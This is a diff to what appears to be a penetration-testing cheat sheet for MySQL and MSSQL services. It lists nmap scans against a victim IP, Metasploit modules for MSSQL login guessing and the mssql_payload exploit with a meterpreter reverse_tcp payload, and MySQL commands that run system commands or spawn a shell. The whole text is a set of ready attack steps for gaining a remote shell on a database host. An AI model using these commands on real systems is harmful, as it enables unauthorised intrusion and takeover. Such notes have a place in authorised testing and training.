@@ -5,8 +5,16 @@
 - nmap -sV -Pn -vv -script=mysql* [victim_ip] -p 3306
 - nmap -sU --script=ms-sql-info [vicrim_ip] -p 3306
 
-#### Metasploit
+#### metasploit
 - msf > use auxiliary/scanner/mssql/mssql_ping
+- msf> use auxiliary/scanner/mssql/mssql_login
+- msf> use exploit/windows/mssql/mssql_payload
+  - set PAYLOAD windows/meterpreter/reverse_tcp
+
+#### Run commands via mysql
+- mysql> select do_system('id');
+- mysql> \! sh
+
 ##### Gain shell using gathered credentials
 - msf > use exploit/windows/mssql/mssql_payload
 - msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
